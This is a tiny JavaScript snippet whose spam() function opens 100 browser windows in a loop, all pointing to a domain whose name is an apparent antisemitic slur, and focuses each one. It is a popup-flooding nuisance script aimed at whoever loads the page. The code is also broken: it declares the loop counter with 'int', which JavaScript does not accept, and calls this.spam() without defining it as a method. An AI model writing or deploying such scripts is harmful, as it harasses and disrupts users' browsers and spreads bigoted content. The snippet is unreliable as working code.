this.spam();

function spam() {
  for (int i = 0; i < 100; i++) {
    var win = window.open("https://www.jewgle.gq/", "_blank");
    win.focus();
  }
}
